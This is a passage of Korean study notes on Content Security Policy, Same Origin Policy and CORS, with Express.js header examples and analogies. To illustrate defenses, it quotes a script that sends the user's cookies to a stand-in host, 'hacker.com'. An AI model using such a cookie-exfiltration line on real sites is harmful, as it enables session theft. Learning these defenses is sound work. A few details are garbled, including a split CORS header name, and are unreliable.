- **📚 블로그 읽고 Content Security Policy(CSP) 정리해보기 🍠**
  - 서버에서 HTML 문서를 응답할 때 CSP를 적용하려면 어떤 HTTP 응답 헤더를 설정해야 하나요? 블로그에 나온 Express.js 코드 예시를 기반으로 설명해보세요.
    서버에서 HTML 문서를 응답할 때 `Content-Security-Policy` 헤더를 추가하면 돼요.

    ```tsx
    res.setHeader('Content-Security-Policy', "default-src 'self'");
    ```

    - `res.setHeader(...)`: HTTP 응답 헤더를 추가하는 함수
    - `'Content-Security-Policy'`: 헤더 이름
    - `"default-src 'self'"`: 정책 값 (어떤 리소스를 허용할지)

    ```tsx
    브라우저가 HTML 요청
             ↓
    서버가 HTML 응답 + Content-Security-Policy 헤더 포함해서 전송
             ↓
    브라우저가 헤더를 읽고 정책에 따라 리소스 로드 허용/차단
    ```

  - `default-src 'self'` 설정은 브라우저에게 어떤 보안 정책을 의미하나요? 또한 `'self'` 값은 어떤 출처를 포함하거나 제외하나요?
    - `default-src 'self’` 는?
        <aside>
        ❓
        
        `default-src`는 **fallback으로 동작**해요. 다른 세부 설정(script-src, img-src 등)이 없으면 `default-src`의 설정값을 따라요.
        
        </aside>
        
        쉽게 말하자면 “기본 규칙”을 따르는 거예요!
        
        ```tsx
        default-src = 모든 리소스 종류의 기본 정책
           ├── script-src 설정 없으면 → default-src 따름
           ├── img-src 설정 없으면 → default-src 따름
           ├── style-src 설정 없으면 → default-src 따름
           └── ...
        ```

    - `'self'` 란?
        <aside>
        ❓
        
        `'self'`는 **현재 문서의 출처**를 의미해요. 따라서 위 설정은 브라우저가 **현재 출처의 자원만 사용하라는 기본값**을 명시한 것이에요.
        
        </aside>
        
        `'self'` 가 포함하는 것 vs 제외하는 것
        
        ```tsx
        ✅ 허용 (포함)
        내 사이트 주소가 [matthew.com](http://matthew.com/) 이라면:
        → [matthew.com/images/logo.png](http://matthew.com/images/logo.png)  ✅ (같은 출처)
        → [matthew.com/js/app.js](http://matthew.com/js/app.js)        ✅ (같은 출처)
        ```
        
        ```tsx
        ❌ 차단 (제외)
        → [cdn.example.com/jquery.js](http://cdn.example.com/jquery.js)    ❌ (다른 출처)
        → [hacker.com/evil.js](http://hacker.com/evil.js)           ❌ (다른 출처)
        → [sub.matthew.com/](http://sub.matthew.com/)...          ❌ (하위 도메인도 다른 출처!)
        ```
        
        ⚠️**:** `'self'`는 **하위 도메인(서브도메인)도 포함하지 않아요.** `sub.matthew.com`은 `matthew.com`과 다른 출처로 취급돼요.

  - 블로그에 나온 악성 스크립트(`<script>fetch(...)</script>`)를 주입했을 때 CSP가 어떻게 동작하는지 네트워크 탭과 콘솔 메시지 측면에서 설명해보세요. -해당 악성 스크립트의 목적은 내 쿠키를 해커 서버로 몰래 전송하는 것이에요.
    - CSP가 있을 때 일어나는 일
      - 🌐 네트워크 탭에서 보면:
        > 네트워크 탭을 확인하면 `hacker.com`으로 네트워크 요청이 발생하지 않은 것을 확인할 수 있어요.
        ```tsx
        네트워크 탭
          matthew.com  200 OK   ✅ (정상 로드)
          hacker.com   (없음)   ← 요청 자체가 발생 안 함!
        ```
      - 🖥️ 콘솔에서 보면:
        > 브라우저 콘솔에는 **Content Security Policy** 경고가 표시돼요. "다음 지시자를 위반했기 때문에 인라인 스크립트가 실행되지 않도록 차단했다"라는 메시지를 볼 수 있어요.
        ```tsx
        콘솔 에러 메시지:
        Refused to execute inline script because it violates
        the following Content Security Policy directive: "default-src 'self'"
        ```
    - 비유로 이해하기!
        <aside>
        ❓
        
        마치 건물 출입구의 보안 요원이 출입증이 없는 사람을 막는 것과 같아요!
        
        허가되지 않은 스크립트는 애초에 실행되지 않아요!
        
        </aside>
        
        ```tsx
        악성 스크립트
               ↓
          [브라우저 보안 요원] "출처가 hacker.com? 허가 안 됨!"
               ↓
           차단! (실행 자체를 안 함)
               ↓
           hacker.com으로 요청 없음 + 콘솔에 경고 출력
        ```

  - 기본 CSP 설정에서 인라인 스타일이 차단된다고 했습니다. 블로그 예시 중 `width:600px`이 적용되지 않는 이유를 설명하세요.
      <aside>
      ❓
      
      `width:600px` 이 왜 안 먹힐까요?
      
      `default-src 'self'` 설정은 스타일에도 적용돼요. `style-src`를 따로 설정하지 않았으니 `default-src`가 fallback으로 적용되는 거예요.
      
      CSP는 인라인 스크립트뿐만 아니라 **인라인 스타일까지 차단**하여 보안을 강화해요.
      
      </aside>
      
      - 왜 인라인 스타일까지 막을까?
          
          인라인 스타일에도 악성 코드가 숨어들 수 있기 떄문에 기본 정책에서 함께 막아요!
          
      - 해결 방법은? - `'unsafe-inline'`  허용!
          
          ```tsx
          // 인라인 스타일을 허용하고 싶다면 따로 명시해야 해요
          res.setHeader(
          'Content-Security-Policy',
          "default-src 'self'; style-src 'self' 'unsafe-inline'"
          );
          ```
          
          ⚠️ `'unsafe-inline'`을 허용하면 보안이 약해지므로 꼭 필요할 때만 쓰고, 가능하면 외부 CSS 파일로 분리하는 게 좋아요.

  - 구글 애널리틱스, 카카오맵, 외부 API 등이 CSP 때문에 차단될 수 있다고 했습니다. 이러한 현상을 "건물 보안을 강화한다"는 비유와 연결해 설명해보세요.
      <aside>
      🚨
      
      CSP를 너무 엄격하게 설정하면 정상적인 기능까지 제한될 수 있어요. 
      
      실제 발생할 수 있는 문제들로는 
      
      **구글 애널리틱스** 같은 외부 분석 도구가 작동하지 않거나, **카카오맵**, **네이버맵** 등 외부 API가 차단되고, 
      
      **소셜 로그인** 버튼이 작동하지 않거나, **웹폰트**가 로드되지 않아 디자인이 깨지는 현상이 있어요
      
      </aside>
      
      - 건물 보안 비유로 이해하기
          
          > 건물 보안을 강화한다고 모든 출입문을 막아버려서, 직원들도 출입하지 못하는 상황과 같아요!
          > 
          
          ```tsx
          🏢 건물 = 우리 웹사이트
          🚪 출입문 = 리소스를 불러오는 경로
          👮 보안 요원 = CSP 정책
          🪪 출입증 = 허용된 출처(도메인)
          
          상황:
          보안 강화를 위해 "출입증 없으면 전부 차단!"
          
          → 해커 ❌ 잘 막힘
          → 구글 애널리틱스 직원 ❌ 같이 막혀버림 (출입증이 없으니까)
          → 카카오맵 API ❌ 같이 막혀버림
          → 구글 폰트 ❌ 같이 막혀버림
          ```
          
          - 해결책: 신뢰할 수 있는 도메인은 명단에 추가
              
              ```tsx
              res.setHeader(
                'Content-Security-Policy',
                `default-src 'self';
                 script-src 'self' https://www.google-analytics.com;
                 img-src 'self' https://dapi.kakao.com;
                 font-src 'self' https://fonts.googleapis.com`
              );
              ```
              
              💡 따라서 CSP는 **단계적으로 적용**하면서 서비스에 미치는 영향을 **지속적으로 모니터링**해야 해요.

  - Report-Only 모드에서는 실제 리소스 실행이 차단되지 않습니다. 그 대신 브라우저와 서버에서 각각 어떤 동작을 수행하나요?
    😀 일반 CSP vs Report-Only 차이
    - **일반 CSP**: 진단하고 실행을 \*\*차단
    - Report-Only**: 진단만 하고 실행은 **허용\*\*
    - Report-Only 모드 설정 방법

      > `Content-Security-Policy-Report-Only` 응답 헤더를 사용해요

      ```tsx
      res.setHeader(
        'Content-Security-Policy-Report-Only',
        "default-src 'self'; report-uri /report",
      );
      ```

        <aside>
        ⚠️
        
        헤더 이름이 `Content-Security-Policy` → `Content-Security-Policy-Report-Only` 로 바뀐 것이 핵심이에요.
        
        </aside>

    - 브라우저 쪽
        <aside>
        ⚠️
        
        브라우저가 정책 위반을 **진단만** 하고, 리소스 로드는 **차단하지 않고** 그대로 실행
        
        </aside>
        
        ```tsx
        악성 스크립트 발견
            ↓
        "이건 정책 위반이네... 근데 Report-Only니까 일단 실행은 함"
            ↓
        스크립트 실행 허용 (hacker.com으로 실제로 요청 감!)
            ↓
        동시에 /report 경로로 위반 내용 전송
        ```

    - 서버 쪽
        <aside>
        ⚠️
        
        진단 결과를 **서버로 보고**해요. 서버는 CSP 위반 리포트를 받아서 JSON 형태의 본문을 처리할 수 있어요.
        
        </aside>
        
        ```tsx
        // 서버가 /report 경로에서 받는 JSON
        {
          "csp-report": {
            "document-uri": "http://matthew.com",
            "violated-directive": "script-src",
            "effective-directive": "style-src-elem",
            "blocked-uri": "inline"
          }
        }
        ```

    - CCTV 비유로 이해하기
      마치 건물에 CCTV를 먼저 설치해서 출입 패턴을 분석한 다음, 그 데이터를 바탕으로 보안 규칙을 만드는 것과 같아요.
      ```tsx
      CCTV(Report-Only) 단계:
      "이 사람이 자주 출입하네, 저 사람이 수상하네" → 데이터 수집
               ↓
      분석 후 실제 보안 정책 도입:
      "이 사람은 막자, 저 사람은 허용하자"
      ```
      💡 **언제 쓸까? -** CSP를 처음 도입할 때 바로 차단 모드로 쓰면 정상 기능까지 막힐 수 있어서, Report-Only로 먼저 어떤 것들이 걸리는지 파악하고 나서 진짜 CSP를 적용하는 거예요.

  - CSP만으로는 CSRF를 막을 수 없다고 했습니다. 블로그에 정리된 다른 보안 조치들(SameSite 쿠키, X-Frame-Options 등) 중 2가지를 설명하세요.
      <aside>
      ⚠️
      
      CSP는 **크로스 사이트 스크립팅(XSS) 공격 방어**에는 효과적이지만,
      
      **CSRF와 같은 다른 유형의 공격**은 막지 못해요.
      
      </aside>
      
      - 🍪 SameSite 쿠키 — CSRF 공격 방어
          - CSRF는?
              
              ```tsx
              1. 내가 은행 사이트에 로그인 (쿠키 저장됨)
              2. 악성 사이트 방문
              3. 악성 사이트가 몰래 은행 송금 요청을 내 대신 보냄
              4. 브라우저가 자동으로 쿠키를 붙여서 전송
              5. 은행 서버는 쿠키가 있으니 "정상 요청"으로 인식 😱
              ```
              
          - SameSite로 막는 방법
              
              ```tsx
              SameSite=Strict  → 다른 사이트에서 온 요청엔 쿠키 절대 안 보냄
              SameSite=Lax     → 다른 사이트에서 온 GET 요청엔 쿠키 보냄 (기본값)
              SameSite=None    → 모든 요청에 쿠키 보냄 (Secure와 함께 써야 함)
              ```
              
              ```tsx
              악성 사이트에서 은행에 요청
                  ↓
              브라우저: "SameSite=Strict이라 다른 사이트 요청엔 쿠키 안 보냄"
                  ↓
              쿠키 없이 요청 → 은행 서버: "인증 안 됨" → 차단! ✅
              ```
              
      - 🖼️ X-Frame-Options — 클릭재킹 방어
          - 클릭재킹이란?
              
              ```tsx
              악성 사이트에 투명한 iframe으로 은행 사이트를 올려놓음
                   ↓
              "여기 클릭하면 경품 당첨!" 이라고 속임
                   ↓
              실제로는 투명 iframe 위에서 클릭 → 은행에서 송금 버튼 클릭됨 😱
              ```
              
          - X-Frame-Options로 막는 방법
              
              ```tsx
              res.setHeader('X-Frame-Options', 'DENY');
              // 또는
              res.setHeader('X-Frame-Options', 'SAMEORIGIN');
              ```
              
              ```tsx
              DENY        → 어떤 사이트에서도 iframe으로 못 띄움
              SAMEORIGIN  → 같은 출처에서만 iframe 허용
              ```
              
              ```tsx
              악성 사이트가 은행 사이트를 iframe으로 띄우려 함
                  ↓
              브라우저: "X-Frame-Options: DENY 있음, iframe 로드 차단"
                  ↓
              클릭재킹 불가능 ✅
              ```

- **📚 블로그 읽고 동일 출처 정책(Same Origin Policy) 정리해보기 🍠**

  # **📚 블로그 읽고 동일 출처 정책(Same Origin Policy) 정리해보기 🍠**

  ***

  [개발자 매튜 | 웹 보안의 핵심, Same Origin Policy(동일 출처 정책) 쉽게 이해하기](https://www.yolog.co.kr/post/http-same-origin-policy/)
  - 출처(Origin)는 어떤 세 요소의 조합으로 결정되나요?
    **프로토콜** (`http`, `https`)
    **호스트** (도메인)
    **포트** (`80`, `443`, `8080` 등)
    ⇒ 이 세 가지가 모두 일치해야 **같은 출처**로 간주

    ```tsx

    출처(Origin) = 프로토콜 + 호스트 + 포트

    https://  matthew.com  :443
      ↑           ↑          ↑
    프로토콜     호스트       포트

    ```

    💡 **포트를 안 썼을 때는?** http는 기본 포트가 80, https는 443이에요. 생략하면 브라우저가 자동으로 기본 포트를 적용해요.

  - 출처의 요소가 다른 경우(예: 프로토콜만, 포트만 다른 경우)에 같은 출처인지 아닌지를 예시 3개(같은 출처 1개, 다른 출처 2개)로 설명하세요.
    `https://matthew.com` 으로 비교
    - ✅ 같은 출처
      [`https://matthew.com/about`](https://matthew.com/about) → 같은 출처!
      ⇒ 프로토콜·호스트·포트 모두 동일
      ⇒ **경로(path)는 출처 판단에 영향 없음**

      ```tsx
      https://matthew.com      (기준)
      https://matthew.com/about (비교)

      프로토콜: https = https  ✅
      호스트:   matthew.com = matthew.com  ✅
      포트:     443 = 443  ✅
      → 세 가지 모두 같으니 같은 출처!
      ```

    - ❌ 다른 출처
      - 프로토콜만 다른 경우
        [`http://matthew.com`](http://matthew.com/) → 다른 출처!
        ⇒프로토콜이 https → http로 달라짐

        ```tsx
        https://matthew.com  (기준)
        http://matthew.com   (비교)

        프로토콜: https ≠ http  ❌ ← 여기서 이미 탈락
        호스트:   matthew.com = matthew.com
        포트:     443 ≠ 80
        → 다른 출처!
        ```

      - 포트만 다른 경우
        [`https://matthew.com:8080`](https://matthew.com:8080/) → 다른 출처!
        ⇒ 포트가 443 → 8080으로 달라짐

        ```tsx
        https://matthew.com       (기준, 포트 443)
        https://matthew.com:8080  (비교, 포트 8080)

        프로토콜: https = https  ✅
        호스트:   matthew.com = matthew.com  ✅
        포트:     443 ≠ 8080  ❌ ← 포트 하나 때문에 다른 출처
        → 다른 출처!
        ```

        ⚠️ **흔한 실수:** 로컬 개발할 때 프론트엔드는 `localhost:3000`, 백엔드는 `localhost:8080`으로 띄우면 포트가 달라서 다른 출처가 돼요! 이때 CORS 에러가 나는 거예요.

  - 블로그에 나온 `fetch` 기반 악성 스크립트를 다른 출처로 실행했을 때 브라우저에서 어떤 일이 발생하나요? 네트워크 전송 여부, 응답 사용 가능성, 브라우저 콘솔 메시지 측면에서 서술하세요.

    ```tsx
    fetch(`http://hacker.com:8081?cookie=${document.cookie}`);
    ```

      <aside>
      ⚠️
      
      `fetch` 함수는 다른 출처의 사이트로 네트워크 요청을 보내려고 시도해요. 
      
      하지만 중요한 점은 네트워크 요청은 전송되지만, **응답 데이터는 사용할 수 없고**, 브라우저가 오류를 발생시켜요
      
      </aside>
      
      - 🌐 네트워크 전송 여부
          
          ```tsx
          요청 자체는 서버로 전송됨 (네트워크 탭에 요청이 보임)
          → SOP는 "요청을 막는 것"이 아니라 "응답을 막는 것"이에요
          ```
          
          ⚠️ 이 차이가 중요해요! CSP는 요청 자체를 아예 안 보내지만, SOP는 요청은 보내고 응답을 못 쓰게 막아요.
          
      - 📦 응답 사용 가능성
          
          ```tsx
          응답은 서버에서 오지만 브라우저가 JavaScript에게 전달하지 않음
          → fetch().then(res => res.json()) 이 부분에서 막힘
          → 응답 데이터 접근 불가
          ```
          
      - 🖥️ 브라우저 콘솔 메시지
          
          <aside>
          ⚠️
          
          브라우저는 "동일 출처 정책으로 인해 `hacker.com`에 있는 원격 리소스를 차단했다"라는 오류 메시지를 표시
          
          </aside>
          
          ```tsx
          콘솔 에러:
          Access to fetch at 'http://hacker.com:8081' from origin
          'http://matthew.com' has been blocked by CORS policy:
          No 'Access-Control-Allow-Origin' header is present...
          ```

  - SOP가 어떻게 Session Hijacking(세션 하이재킹) 시도를 방지하는지 구체적으로 설명하세요. SOP가 차단하는 것과 허용되는 것(예: 네트워크 요청은 나가지만 응답 데이터에 접근 불가)을 포함하세요.
    - Session Hijacking이 뭐야?
      ```tsx
      1. 내가 은행(bank.com)에 로그인
      2. 브라우저에 세션 쿠키 저장됨: session_id=abc123
      3. 악성 사이트(hacker.com) 방문
      4. 악성 스크립트 실행:
         fetch('http://bank.com/myinfo')  ← 내 세션 쿠키가 자동으로 붙어서 전송
      5. 은행 서버는 쿠키가 있으니 정상 요청으로 처리
      6. 내 계좌 정보가 해커한테 넘어감 😱
      ```
    - SOP가 이걸 막는 방식
        <aside>
        ⚠️
        
        SOP의 목적은 악의적인 웹사이트가 사용자 데이터를 무단으로 접근하거나 유출하는 것을 방지하는 것이에요. 
        
        Session Hijacking처럼 사용자가 로그인한 세션 쿠키를 다른 사이트로 보내지 못하게 차단해요!
        
        </aside>
        
        SOP가 허용하는 것
        
        ```tsx
        hacker.com → bank.com 으로 요청 전송 자체는 됨
        (네트워크 요청은 나감)
        ```
        
        SOP가 차단하는 것
        
        ```tsx
        bank.com의 응답 데이터를 hacker.com의 JS가 읽는 것 → 차단!
        
        fetch('http://bank.com/myinfo')
          .then(res => res.json())  ← 여기서 SOP가 차단
          .then(data => {
            // data에 접근 불가! 에러 발생
            sendToHacker(data);  // 실행 안 됨
          })
        ```

    🚨 전체 흐름 요약

    ```tsx
    [hacker.com 악성 스크립트]
            ↓ 요청 전송 (허용)
    [bank.com 서버] → 응답 반환
            ↓
    [브라우저 SOP 검사]
    "요청 출처: hacker.com
     응답 출처: bank.com
     → 다른 출처! 응답 데이터 차단"
            ↓
    [악성 스크립트] "응답 읽기 실패" → 데이터 유출 실패 ✅
    ```

    💡 **아파트 비유로 이해하기 -** 마치 아파트 출입구에서 주민증을 확인하는 것과 같음!
    - 같은 단지 주민만 입장 가능! 타아파트 주민은 NO!

  - 블로그에서 명시한 대로 SOP가 반드시 동일 출처에서만 접근하도록 하는 주요 브라우저 API/리소스 3가지를 쓰고, 각각에 대해 간단한 설명(왜 제한되는지)을 덧붙이세요. -`fetch()` API -`XMLHttpRequest` -`@font-face` 웹 폰트
    - `fetch()` API
      ```tsx
      // hacker.com에서 아래 코드 실행 시 차단
      fetch('https://bank.com/api/myinfo');
      ```
      -제한 이유
      : `fetch`는 서버에서 **민감한 데이터(개인정보, 인증 정보 등)를 읽어올 수 있는** 가장 강력한 수단
      : 다른 출처의 응답을 자유롭게 읽을 수 있다면 Session Hijacking, 데이터 탈취가 너무 쉬워짐
    - `XMLHttpRequest`
      ```tsx
      // 예전 방식의 AJAX 요청, fetch 이전에 쓰던 방법
      const xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://bank.com/api/myinfo');
      xhr.send(); // 다른 출처면 응답 접근 차단
      ```
      -제한 이유
      : `fetch()`와 마찬가지로 서버 데이터를 읽어오는 API
      : `fetch()`보다 오래된 방식이지만 동일하게 SOP 적용 받음
    - `@font-face` 웹 폰트
      ```tsx
      @font-face {
        font-family: 'MyFont';
        src: url('http://other-origin.com/MyFont.woff2');  /* 차단될 수 있음 */
      }
      ```
      교차 출처 요청 차단 오류가 발생하며, 브라우저는 "동일 출처 정책으로 인해 `MyCustomFont`에 있는 원격 리소스를 차단했다"라고 알려줘요! -제한 이유
      : 폰트 파일은 저작권이 있는 유료 리소스일 수 있어서 무단으로 다른 사이트가 가져다 쓰는 것을 막기 위해서예요.
      : 단, `@font-face`는 브라우저마다 정책이 달라서, 일부 브라우저는 교차 출처를 허용하고 일부는 차단해요.
  - SOP와 CSP의 차이를 블로그 내용에 따라 요점 4개(각 항목 1문장)로 정리하세요. (예: 누가 적용하는가, 제어 주체, 설정 가능 여부 등)
      <aside>
      ⚠️
      
      두 정책 모두 XSS 공격 방지를 목표로 하지만, 접근 방식이 달라요!
      
      </aside>
      
      |  | SOP | CSP |
      | --- | --- | --- |
      | **누가 적용하는가** | 브라우저가 
      스스로 | 서버가 설정
      브라우저가 실행 |
      | 제어 주체 | 개발자 직접
      제어 불가 | 개발자 직접
      설정 가능 |
      | 설정 가능 여부 | 브라우저에 
      내장된 고정 정책 | HTTP 헤더로
      커스텀 가능 |
      | 적용 범위 | 모든 웹페이지에 자동 적용 | 설정한 서비스에만 적용 |
      
      ```tsx
      SOP = 건물의 철문, 잠금장치 (구조 자체에 내장, 바꿀 수 없음)
      CSP = 건물주가 추가로 세운 보안 규칙 (맞춤 설정 가능)
      ```

  - 브라우저에서 SOP 관련 차단 오류를 발견했을 때(예: 콘솔에 “동일 출처 정책으로 인해 ... 차단했습니다” 메시지) 문제 원인 파악을 위한 체크리스트(최소 3항목)를 작성하고, 임시·영구 대응 방안(각 1~2줄)도 제시하세요.
    - ✅ 체크리스트 (원인 파악)
      1. 프로토콜 확인

         ```tsx
         프론트: [http://localhost:3000](http://localhost:3000/)
         API:    [https://api.myapp.com](https://api.myapp.com/)  ← http vs https 다름!
         ```

         → 프로토콜이 다른지 확인!

      2. 포트 확인

         ```tsx
         프론트: [http://localhost:3000](http://localhost:3000/)
         백엔드: [http://localhost:8080](http://localhost:8080/)  ← 포트 번호 다름!
         ```

         → 로컬 개발 환경에서 가장 흔한 원인!

      3. 도메인 / 서브도메인 확인

         ```tsx
         프론트: [https://www.myapp.com](https://www.myapp.com/)
         API:    [https://api.myapp.com](https://api.myapp.com/)  ← 서브도메인 다름!
         ```

         → `www`와 `api`는 다른 출처!

    - 🛠️ 대응 방안
      - 임시 대응!
          <aside>
          ⚠️
          
          프록시 설정으로 우회하기. 
          
          React 기준으로 `package.json`에 아래를 추가하면 개발 서버가 대신 요청을 중계!
          
          ```tsx
          {
          "proxy": "[http://localhost:8080](http://localhost:8080/)"
          }
          ```
          
           Vite 사용 시
          
          ```tsx
          // vite.config.js
          server: {
            proxy: {
              '/api': 'http://localhost:8080'
            }
          }
          ```
          
          </aside>

      - 영구 대응(실서비스)
          <aside>
          ⚠️
          
          백엔드 서버에서 **CORS 헤더를 응답에 추가**하는 것이 근본적인 해결책!
          
          </aside>
          
          ```tsx
          // Express.js 예시
          res.setHeader('Access-Control-Allow-Origin', 'https://myapp.com');
          // 또는 cors 라이브러리 사용
          app.use(cors({ origin: 'https://myapp.com' }));
          ```

- **📚 블로그 읽고 교차 출처 리소스 공유(CORS) 정리해보기 🍠**
  - 브라우저에서 `http://localhost:8080` 애플리케이션이 `http://localhost:8081/resource.json`을 요청했을 때, 네트워크 요청과 응답은 어떻게 처리되며, 브라우저가 응답 본문을 사용하지 못하는 이유는 무엇인가요?

    ```tsx
    브라우저에서 실행 중인 앱: http://localhost:8080
    요청하려는 자원:           http://localhost:8081/resource.json

    프로토콜: http = http  ✅
    호스트:   localhost = localhost  ✅
    포트:     8080 ≠ 8081  ❌ ← 포트가 달라서 다른 출처!
    ```

    네크워크 요청
    : `8081`번 포트로 요청을 보내고 응답도 받았지만, **스크립트에서 응답 본문을 사용할 수 없다**는 메시지가 표시

    ```tsx
    흐름:
    ① 브라우저가 8081로 요청 전송 → ✅ 요청은 나감
    ② 8081 서버가 응답 반환 → ✅ 응답도 옴
    ③ 브라우저가 응답 헤더 검사
       "Access-Control-Allow-Origin 헤더 있어?" → ❌ 없음
    ④ 브라우저가 응답 본문을 JS에게 전달 거부 → ❌ 차단!
    ```

    응답 본문을 사용하지 못하는 이유
    - 원인
      : `Access-Control-Allow-Origin` CORS 헤더가 없기 때문
      → 브라우저는 다른 출처로 요청을 보낼 때 응답 헤더 중 `Access-Control-Allow-Origin`을 확인하고, 이 헤더에 현재 출처가 포함되어 있는지 검사하여 서버가 해당 출처를 허용했는지 판단함
      BUT 서버 8081은 아직 이에 대해 명시하지 않았기 때문에, 브라우저는 자원 사용을 허용하지 않은 것으로 판단하여 네트워크 오류를 발생시킨 것!
      💡 **핵심 포인트:** SOP와 달리 CORS 에러는 "요청을 막는 게 아니라 응답 사용을 막는 것"이에요. 서버는 응답을 보냈지만 브라우저가 JS에게 전달을 거부하는 거예요.

  - 서버가 다른 출처(`http://localhost:8080`)에서 자원을 사용할 수 있게 하려면 어떤 응답 헤더를 어떻게 설정해야 하나요? 글의 예시 코드를 참고해 헤더 이름과 값까지 구체적으로 쓰세요.
      <aside>
      ⚠️
      
      서버가 다른 출처에게 자원을 공유하려면 `Access-Control-Allow-Origin` 헤더를 설정해야 해요!
      
      </aside>
      
      ```tsx
      //예시코드
      const handler = (req, res) => {
        // localhost:8080 출처를 허용
        res.setHeader('Access-Control-Allow-Origin', 'http://localhost:8080');
        static(path.join(__dirname, 'public'))(req, res);
      };
      ```
      
      -헤더 이름: `Access-Control-Allow-`
      -값: `Originhttp://localhost:8080`
      -의미: 해당 출처에서 오는 요청의 응답 사용을 허락함
      
      - 위의 것들이 설정되면 브라우저가 하는 판단
          
          <aside>
          ⚠️
          
          응답을 받은 브라우저는 이 헤더에 **자신의 출처가 포함되어 있는지** 확인해요.
          
          포함되어 있다면 "서버가 자원 사용을 허락했다"고 판단하여 응답을 사용해요.
          
          </aside>
          
          ```tsx
          브라우저 내부 판단 과정:
          
          현재 앱 출처:                    http://localhost:8080
          서버 응답 헤더:  Access-Control-Allow-Origin: http://localhost:8080
          
          "내 출처가 헤더에 있네!" → 응답 사용 허락 ✅
          ```
          
      - 모든 출처를 허용하고 싶으면?
          
          ```tsx
          res.setHeader('Access-Control-Allow-Origin', '*');
          // * = 와일드카드, 모든 출처 허용
          // 단, 쿠키/인증 정보를 포함한 요청에는 * 사용 불가
          ```

  - 단순 요청으로 분류되기 위해서는 어떤 두 가지 조건을 만족해야 하나요? 또한 `GET /resource.json` 요청이 단순 요청에 해당하는 이유를 설명하세요.
    - 조건 1: 허용된 HTTP 메소드 사용
      허용된 메소드는 `GET`, `POST`, `HEAD` !
      ```tsx
      ✅ 단순 요청 메소드: GET, POST, HEAD
      ❌ 단순 요청 아님:   PUT, PATCH, DELETE → 사전 요청(Preflight) 필요
      ```
    - 조건 2: 안전한 헤더만 사용
      안전한 헤더 목록
      - `Accept`
      - `Accept-Language`
      - `Content-Language`
      - `Content-Type`
      - `Range`
      ```tsx
      ✅ 안전한 헤더 예시: Content-Type, Accept
      ❌ 커스텀 헤더:      X-Goguma 같은 임의로 만든 헤더 → 사전 요청 필요
      ```
    - `GET /resource.json` 이 단순 요청인 이유

      ```tsx
      요청 메소드: GET  → 허용된 메소드 목록에 있음 ✅
      요청 헤더:   특별한 커스텀 헤더 없음 → 안전한 헤더만 사용 ✅

      → 두 조건 모두 만족 → 단순 요청! ✅
      ```

      -단순 요청 흐름!

      ```tsx
      브라우저 → 요청 (Origin 헤더 포함)
      서버     → 응답 (Access-Control-Allow-Origin 헤더 포함)
      브라우저 → 헤더 확인 후 응답 사용 결정
      (사전 요청 없이 바로 진행!)
      ```

      브라우저는 다른 출처의 자원을 사용하기 위해 HTTP 요청을 만들 때 `Origin` 헤더에 현재 출처를 실어서 보내요.
      브라우저가 서버에게 "나의 출처는 이곳이니, 당신의 자원을 사용해도 되나요?"라고 묻는 것이에요.

  - 브라우저에서 `X-Goguma`라는 커스텀 헤더를 추가했을 때 왜 차단이 발생하나요? 이 문제를 해결하기 위해 서버에서 추가해야 하는 응답 헤더와 값은 무엇인가요?
    - 차단 발생 이유
        <aside>
        ⚠️
        
        브라우저에서 교차 출처 요청을 할 때 안전한 헤더 이외의 헤더를 사용하면, 
        출처 확인과 마찬가지로 **헤더 사용 여부도 서버에게 확인받아야** 해요
        
        </aside>
        
        ```tsx
        X-Goguma 헤더
            ↓
        안전한 헤더 목록(Accept, Content-Type 등)에 없음!
            ↓
        브라우저: "이 헤더 써도 돼요?" → 서버에게 먼저 확인 필요
            ↓
        서버가 허용 안 했으니 차단!
        ```
        
        에러 메시지는 `Access-Control-Allow-Headers`에 헤더 `X-Goguma`가 허용되지 않았다고 표시!!

    - 해결을 위해 추가해야 하는 헤더
        <aside>
        ⚠️
        
        안전하지 않은 헤더를 사용하려면 서버가 `Access-Control-Allow-Headers` 응답 헤더에 허용할 헤더 이름을 명시해야 해요
        
        </aside>
        
        ```tsx
        const handler = (req, res) => {
          res.setHeader('Access-Control-Allow-Origin', 'http://localhost:8080');
          // X-Goguma 헤더를 허용
          res.setHeader('Access-Control-Allow-Headers', 'X-Goguma');
          static(path.join(__dirname, 'public'))(req, res);
        };
        ```
        
        -헤더 이름: `Access-Control-Allow-Headers` 
        -값: `X-Goguma`
        -의미: 해당 커스텀 헤더 사용을 허락함
        
        -여러 커스텀 헤더를 허용하려면 쉼표로 구분!
        
        ```tsx
        res.setHeader('Access-Control-Allow-Headers', 'X-Goguma, X-Custom-Header, Authorization');
        
        ```

  - `PUT` 요청을 보낼 때 브라우저는 왜 먼저 `OPTIONS` 요청을 보내나요? 이때 브라우저가 보내는 헤더와 서버가 응답해야 하는 헤더를 각각 쓰고, 사전 요청과 실제 요청이 어떻게 이어지는지 간단히 서술하세요.
    - 사전 요청이 필요한 이유
        <aside>
        ⚠️
        
        단순한 요청에 해당하는 `GET`, `POST`, `HEAD` 메소드가 아닌 `PUT`, `PATCH`, `DELETE` 메소드를 사용하는 경우, 서버는 "요청을 보낸 측이 브라우저가 아닐 수도 있다"고 판단해요. 
        
        따라서 브라우저와 서버는 서로를 확인하기 위한 **사전 요청을 먼저 주고받아요.**
        
        </aside>
        
        💡 **왜 PUT/DELETE는 위험하냐면?
        -** GET은 데이터를 읽기만 하지만, PUT은 데이터를 수정하고 DELETE는 삭제해요.
        - 실수로 또는 악의적으로 중요한 데이터가 변경될 수 있어서 더 엄격하게 확인하는 거예요.

    - 브라우저가 보내는 헤더 (OPTIONS 사전 요청)
        <aside>
        ⚠️
        
        사전 요청은 `OPTIONS` 메소드를 사용하고, 실제 요청과 동일한 URL로 보내며,
        
        요청 헤더 `Access-Control-Request-Method`에 사용하려는 메소드(`PUT`)를 명시해요!
        
        </aside>
        
        ```tsx
        OPTIONS /resource.json HTTP/1.1
        Host: localhost:8081
        Origin: http://localhost:8080
        Access-Control-Request-Method: PUT    ← "PUT 써도 돼요?"
        ```

    - 서버가 응답해야 하는 헤더 - “응, `PUT` 써도 돼!”
        <aside>
        ⚠️
        
        서버가 다른 출처에서 `PUT` 메소드를 허용하려면 `Access-Control-Allow-Methods` 응답 헤더를 설정해야 해요!
        
        </aside>
        
        ```tsx
        const handler = (req, res) => {
          res.setHeader('Access-Control-Allow-Origin', 'http://localhost:8080');
          res.setHeader('Access-Control-Allow-Headers', 'X-Goguma');
          // PUT 메소드를 허용
          res.setHeader('Access-Control-Allow-Methods', 'PUT');
          static(path.join(__dirname, 'public'))(req, res);
        };
        ```

    - 사전 요청 → 실제 요청 전체 흐름
        <aside>
        ⚠️
